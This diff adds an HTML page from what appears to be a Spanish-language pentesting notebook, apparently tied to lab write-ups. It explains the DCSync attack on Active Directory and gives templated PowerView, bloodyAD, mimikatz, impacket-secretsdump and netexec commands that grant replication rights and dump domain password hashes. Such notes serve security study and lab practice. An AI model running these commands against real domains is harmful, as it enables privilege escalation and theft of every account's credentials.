@@ -1,0 +1,112 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>DCSync Attack | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="dcsync-attack">
+          <div class="note-tabbar">
+            <span>DCSync Attack</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Active Directory/Escalada/Dominio y servicios</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">active directory / escalada / dominio</p>
+            <h2>DCSync Attack</h2>
+
+            <p>DCSync permite solicitar replicación de secretos del dominio cuando una cuenta tiene permisos de replicación o puede asignárselos mediante ACL.</p>
+
+            <p><span class="notebook-review-note">Aviso: <code>DCSync attack</code> permite suplantar la identidad de otro DC para extraer hashes del NTDS del AD</span></p>
+            <p><span class="notebook-review-note">Aviso: hacen falta permisos DCSync o permisos equivalentes como <code>GenericAll</code> / <code>WriteDACL</code> sobre el dominio.</span></p>
+            <p>- <code>DS-Replication-Get-Changes (Replicating Directory Changes)</code></p>
+            <p>- <code>DS-Replication-Get-Changes-All (Replicating Directory Changes All)</code></p>
+            <p>Un usuario del grupo <code>Exchange Windows Permissions</code> o con privilegios <code>WriteDACL</code> sobre el dominio (o sobre un usuario en específico por lo que solamente podrá agregarle permisos DCSync a ese usuario) puede asignarse estos permisos y ejecutar el ataque.</p>
+            <h2>Enumerar Usuarios con Permisos DCSync, WriteDACL o GenericAll</h2>
+            <p><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1">PowerView.ps1</a></p>
+            <section class="code-card">
+              <h3>PowerShell: PowerView -&gt; Enumerar usuarios con permisos DCSync</h3>
+              <pre><code>. .\PowerView.ps1
+
+Get-ObjectAcl -DistinguishedName &quot;dc=&lt;dominio&gt;,dc=&lt;dominio&gt;&quot; -ResolveGUIDs | ?{($_.ObjectType -match &#x27;replication-get&#x27;) -or ($_.ActiveDirectoryRights -match &#x27;GenericAll&#x27;) -or ($_.ActiveDirectoryRights -match &#x27;WriteDacl&#x27;)}</code></pre>
+            </section>
+            <h2>Otorgar permisos DCSync (WriteDACL)</h2>
+            <section class="code-card">
+              <h3>PowerShell: Otorgar permisos DCSync con PowerView</h3>
+              <pre><code>. .\PowerView.ps1
+# Actor: Usuario con privilegios (WriteDACL) para poder otorgar permisos DCSync 
+# Beneficiado: Usuario que recibirá permisos DCSync. Actor puede ser Beneficiado también
+$SecPass = ConvertTo-SecureString &lt;password_actor&gt; -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential(&#x27;&lt;dominio&gt;.&lt;dominio&gt;\&lt;user_actor&gt;&#x27;, $SecPass)
+# Si omites &quot;-Credential $Cred&quot; se tomará las credenciales del usuario actual como Actor
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity &quot;DC=&lt;dominio&gt;,DC=&lt;dominio&gt;&quot; -PrincipalIdentity &lt;user_beneficiado&gt; -Rights DCSync</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Kali: Otorgar permisos DCSync</h3>
+              <pre><code>bloodyAD --host &lt;hostname&gt;.&lt;dominio&gt; --dc-ip &lt;ip_dc&gt; -d &quot;&lt;dominio&gt;&quot; -u &#x27;&lt;user_actor&gt;&#x27; -p &#x27;&lt;password_actor&gt;&#x27; add dcsync &quot;&lt;user_beneficiado&gt;&quot;</code></pre>
+            </section>
+            <h2>Dumpear NTDS (Permisos DCSync)</h2>
+            <section class="code-card">
+              <h3>PowerShell: Dumpear NTDS.dit con el usuario con permisos DCSync</h3>
+              <pre><code>mimikatz.exe
+privilege::debug
+# Dumpear NTDS de todos los usuarios del dominio: htb.local
+lsadump::dcsync /domain:&lt;domain&gt;.&lt;domain&gt; /all
+# Dumpear NTDS de un usuario. Ej. /user:Administrator /user:htb\krbtgt
+lsadump::dcsync /domain:&lt;domain&gt;.&lt;domain&gt; /user:&lt;user&gt;</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Kali: Dumpear NTDS con el usuario con permisos DCSync</h3>
+              <pre><code># Impacket
+impacket-secretsdump &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip_dc&gt;
+impacket-secretsdump &#x27;&lt;user&gt;:&lt;password&gt;@&lt;ip_dc&gt;&#x27; -just-dc-ntlm
+# Netexec
+netexec smb &lt;ip_dc&gt; -u &lt;user&gt; -p &lt;pass&gt; --ntds</code></pre>
+            </section>
+
+            <h2>Relacionados</h2>
+            <div class="notebook-related-links">
+              <a href="/writeups.html?machine=forest">Forest</a>
+              <a href="/writeups.html?machine=sauna">Sauna</a>
+              <a href="/notebook/active-directory/escalada/acl/acl.html">ACL</a>
+              <a href="/notebook/post-explotacion/windows/dumping-hashes/ntds.html">NTDS</a>
+            </div>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>ad</span>
+              <span>active_directory</span>
+              <span>escalada</span>
+              <span>dcsync</span>
+              <span>ntds</span>
+              <span>writedacl</span>
+              <span>genericall</span>
+              <span>exchange_windows_permissions</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
